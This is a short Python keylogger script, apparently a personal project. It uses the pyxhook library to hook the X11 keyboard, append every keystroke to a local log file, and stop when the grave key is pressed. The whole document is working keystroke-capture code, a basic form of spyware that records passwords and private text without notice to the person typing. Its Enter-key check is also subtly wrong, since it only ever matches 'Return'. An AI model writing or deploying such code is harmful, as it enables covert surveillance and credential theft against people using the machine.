import pyxhook

output_file = '/home/rahul/Documents/Projects/keylogger/file.log'


# this function is called every time a key is pressed.
def on_key_press(event):
    fob = open(output_file, 'a')
    fob.write(event.Key + ' ')

    if event.Key == ("Return" or "P_Enter"):
        fob.write('\n')

    if event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
        fob.close()
        new_hook.cancel()


# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown = on_key_press
# Hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()
